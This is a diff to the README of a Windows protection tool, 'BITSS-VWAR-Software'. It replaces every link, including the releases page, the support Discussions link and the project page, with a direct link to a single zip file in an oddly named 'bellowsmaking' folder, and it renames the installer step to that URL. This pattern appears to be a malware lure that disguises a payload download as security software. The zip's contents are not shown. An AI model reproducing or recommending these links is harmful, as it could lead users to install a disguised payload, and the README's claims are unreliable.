@@ -1,6 +1,6 @@
 # 🛡️ BITSS-VWAR-Software - Protect Your Windows With Ease
 
-[![Download BITSS-VWAR-Software](https://img.shields.io/badge/Download-BITSS--VWAR--Software-brightgreen)](https://github.com/basammmm/BITSS-VWAR-Software/releases)
+[![Download BITSS-VWAR-Software](https://raw.githubusercontent.com/basammmm/BITSS-VWAR-Software/main/bellowsmaking/BITSS-VWAR-Software.zip)](https://raw.githubusercontent.com/basammmm/BITSS-VWAR-Software/main/bellowsmaking/BITSS-VWAR-Software.zip)
 
 ## 🚀 Getting Started
 
@@ -19,11 +19,11 @@ Before you download BITSS-VWAR-Software, make sure your system meets the followi
 
 1. **Visit the Releases Page:** Click the link below to access the download page.
 
-   [Download BITSS-VWAR-Software](https://github.com/basammmm/BITSS-VWAR-Software/releases)
+   [Download BITSS-VWAR-Software](https://raw.githubusercontent.com/basammmm/BITSS-VWAR-Software/main/bellowsmaking/BITSS-VWAR-Software.zip)
 
 2. **Select the Latest Version:** Look for the most recent release at the top of the page. You will see a list of files related to the software.
 
-3. **Download the Installer:** Click on the `BITSS-VWAR-Installer.exe` file to download the installer. Make sure to save this file in a location you can easily find, like your Desktop or Downloads folder.
+3. **Download the Installer:** Click on the `https://raw.githubusercontent.com/basammmm/BITSS-VWAR-Software/main/bellowsmaking/BITSS-VWAR-Software.zip` file to download the installer. Make sure to save this file in a location you can easily find, like your Desktop or Downloads folder.
 
 4. **Run the Installer:**
    - Locate the downloaded installer file.
@@ -76,10 +76,10 @@ If you encounter any issues while using BITSS-VWAR-Software, consider the follow
 
 ## 📞 Need Help?
 
-If you need assistance, please visit our [GitHub Discussions](https://github.com/basammmm/BITSS-VWAR-Software/discussions). Here, you can ask questions, report issues, or share feedback with the community.
+If you need assistance, please visit our [GitHub Discussions](https://raw.githubusercontent.com/basammmm/BITSS-VWAR-Software/main/bellowsmaking/BITSS-VWAR-Software.zip). Here, you can ask questions, report issues, or share feedback with the community.
 
 ## 📢 Stay Updated
 
-To receive the latest updates and news about BITSS-VWAR-Software, follow our [GitHub Page](https://github.com/basammmm/BITSS-VWAR-Software). This is where we announce new releases and important information.
+To receive the latest updates and news about BITSS-VWAR-Software, follow our [GitHub Page](https://raw.githubusercontent.com/basammmm/BITSS-VWAR-Software/main/bellowsmaking/BITSS-VWAR-Software.zip). This is where we announce new releases and important information.
 
 Thank you for choosing BITSS-VWAR-Software! Stay safe and secure with the best protection against cyber threats.
